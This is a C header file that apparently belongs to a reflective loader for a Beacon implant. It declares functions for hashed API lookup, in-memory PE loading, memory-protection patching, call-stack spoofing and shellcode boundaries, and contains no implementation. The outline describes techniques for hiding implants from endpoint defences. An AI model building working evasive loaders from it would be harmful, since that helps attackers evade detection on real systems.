#include "windows.h"

#include "Instance.h"
#include "BeaconUserData.h"

typedef void (WINAPI* DLLMAIN)(...);

/*  ---------------------
    Api.c 
--------------------- */

PVOID   xGetModuleHandle    (DWORD dwModuleHash);
PVOID   xGetProcAddress     (PVOID pModuleAddr, DWORD dwProcHash);
DWORD   djb2A               (PBYTE str);
DWORD   djb2W               (LPWSTR str);
VOID    xMemcpy             (PBYTE dst, PBYTE src, DWORD size);
VOID    xMemset             (PBYTE dst, BYTE c, DWORD size);

/*  ---------------------
    Main.c 
--------------------- */
VOID Main(
    _In_    PVOID       Param,
    _In_    PINSTANCE   Inst
);

/*  ---------------------
    Reflective.c 
--------------------- */
VOID CopySections(
	_In_	PVOID				pMemPeAddr, 
	_In_	PIMAGE_NT_HEADERS	pNtHeader, 
	_In_	PVOID				peContent
);

BOOL ProcessImportTable(
	_In_	PVOID				pMemPeAddr, 
	_In_	PIMAGE_NT_HEADERS	pNtHeader,
    _In_    PINSTANCE           Inst
);

VOID ApplyBaseRelocations(
	_In_	PVOID				pMemPeAddr, 
	_In_	PIMAGE_NT_HEADERS	pNtHeader
);

BOOL PatchMemoryProtection(
	_In_	PVOID					pMemPeAddr, 
	_In_	PIMAGE_NT_HEADERS		pNtHeader,
    _In_    PINSTANCE               Inst,
	_Inout_	PALLOCATED_MEMORY		allocatedMemory
);



/*  ---------------------
    Spoof.c 
--------------------- */
PVOID   SpoofCall(
    _In_    PINSTANCE  Inst,
    _In_    PVOID   pFunctionAddr,
    _In_    PVOID   pArg1,
    _In_    PVOID   pArg2,
    _In_    PVOID   pArg3,
    _In_    PVOID   pArg4,
    _In_    PVOID   pArg5,
    _In_    PVOID   pArg6,
    _In_    PVOID   pArg7,
    _In_    PVOID   pArg8,
    _In_    PVOID   pArg9,
    _In_    PVOID   pArg10,
    _In_    PVOID   pArg11,
    _In_    PVOID   pArg12
);


/*  ---------------------
    Entry.s 
--------------------- */
void*   GetShellcodeStart();
void*   GetShellcodeEnd();

/*  ---------------------
    Utils.s 
--------------------- */
extern void* SpoofStub(...);

